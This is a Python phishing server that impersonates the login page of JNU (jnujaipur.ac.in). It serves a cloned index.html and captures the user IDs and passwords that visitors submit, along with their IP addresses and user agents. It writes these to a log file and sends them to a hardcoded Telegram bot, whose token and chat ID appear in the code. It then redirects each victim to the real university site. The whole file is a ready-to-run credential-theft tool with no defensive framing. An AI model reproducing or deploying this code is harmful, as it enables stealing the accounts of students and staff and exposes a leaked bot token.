from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import datetime
import os
import subprocess
import sys
import time
import telebot
import socket

# === CONFIGURATION ===
HOST = '0.0.0.0'  # sab IP se access ke liye
PORT = 5051

SERVICE_NAME = "JNU"
REDIRECT_URL = "https://jnujaipur.ac.in/"

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
INDEX_PATH = os.path.join(CURRENT_DIR, 'index.html')
LOG_PATH = os.path.join(CURRENT_DIR, f'{SERVICE_NAME.lower()}_log.txt')

# Telegram Bot Settings
TELEGRAM_BOT_TOKEN = "5154193675:AAE2sU4FJe_RLIHopHxFD2799pgR9XTi80U"
TELEGRAM_CHAT_ID = "5071094116"

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

def kill_existing_process_on_port(port):
    try:
        result = subprocess.run(["fuser", f"{port}/tcp"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        output = result.stdout.decode().strip()
        if output:
            pids = output.split()
            for pid in pids:
                os.kill(int(pid), 9)
            print(f"[!] Killed process(es) using port {port}: {' '.join(pids)}")
            time.sleep(1)
    except Exception as e:
        print(f"[!] Error checking port usage: {e}")

class JNUHandler(BaseHTTPRequestHandler):
    def get_client_ip(self):
        forwarded_for = self.headers.get('X-Forwarded-For')
        if forwarded_for:
            ip = forwarded_for.split(',')[0].strip()
        else:
            ip = self.client_address[0]
        return ip

    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            try:
                with open(INDEX_PATH, 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                print(f"[!] {INDEX_PATH} not found.")
                self.send_error(404, 'index.html not found')
        else:
            self.send_error(404, 'Page not found')

    def do_POST(self):
        if self.path != '/':
            self.send_error(404, 'Invalid POST')
            return

        length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(length).decode('utf-8')
        data = urllib.parse.parse_qs(post_data)

        userid = data.get('userid', [''])[0]
        password = data.get('password', [''])[0]
        ip = self.get_client_ip()
        user_agent = self.headers.get('User-Agent', 'Unknown')
        now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        log_entry = (
            f"{SERVICE_NAME} Credentials Captured:\n"
            f"Time: {now}\n"
            f"IP: {ip}\n"
            f"User-Agent: {user_agent}\n"
            f"UserID: {userid}\n"
            f"Password: {password}\n"
            f"{'-'*30}\n"
        )

        try:
            with open(LOG_PATH, 'a') as f:
                f.write(log_entry)
        except Exception as e:
            print(f"[!] Failed to write log: {e}")

        try:
            bot.send_message(
                TELEGRAM_CHAT_ID,
                f"{SERVICE_NAME} Credentials:\n\nTime: {now}\nIP: {ip}\nUser-Agent: {user_agent}\nUserID: {userid}\nPassword: {password}"
            )
        except Exception as e:
            print(f"[!] Telegram error: {e}")

        self.send_response(302)
        self.send_header('Location', REDIRECT_URL)
        self.end_headers()

class ReusableHTTPServer(HTTPServer):
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        super().server_bind()

if __name__ == '__main__':
    if not os.path.isfile(INDEX_PATH):
        print(f"[!] Error: {INDEX_PATH} file missing.")
        sys.exit(1)

    kill_existing_process_on_port(PORT)
    print(f"[+] Server running at http://{HOST}:{PORT} for {SERVICE_NAME}")
    server = ReusableHTTPServer((HOST, PORT), JNUHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[+] Shutting down server...")
        server.server_close()

